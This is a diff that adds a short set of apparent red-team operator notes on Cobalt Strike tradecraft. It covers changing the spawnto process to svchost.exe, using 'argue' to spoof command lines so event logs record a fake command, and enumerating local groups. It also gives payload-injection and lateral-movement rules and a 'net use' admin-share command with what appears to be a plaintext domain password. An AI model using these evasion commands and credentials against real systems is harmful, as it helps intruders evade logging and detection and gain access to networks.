@@ -1,0 +1,31 @@
+SAFETY
+use spawnto_x86 %windir%\syswow64\svchost.exe  in order to not use rundll32
+
+spawnto x86 %windir%\syswow64\svchost.exe
+spawnto x64 %windir%\sysnative\svchost.exe
+
+use argue command
+
+command 1 = argue ipconfig what is this?
+
+command 2 = run ipconfig /all
+
+The machine will run "ipconfig /all", but show under event logs that you ran "ipconfig what is this?" 
+
+
+
+Get-NetLocalGroup -COmputerName <computername> -GroupName "<groupname>"
+
+shell net use \\ARGON\C$ /U:CITADEL\bharris_a vek3irj1shKt! 
+
+do not inject HTTPS payloads into anything other than explorer
+
+Coballt Strike
+
+Do not use net commands native to CS
+Do not laterally move with built in cobalt strike tools
+
+
+
+
+
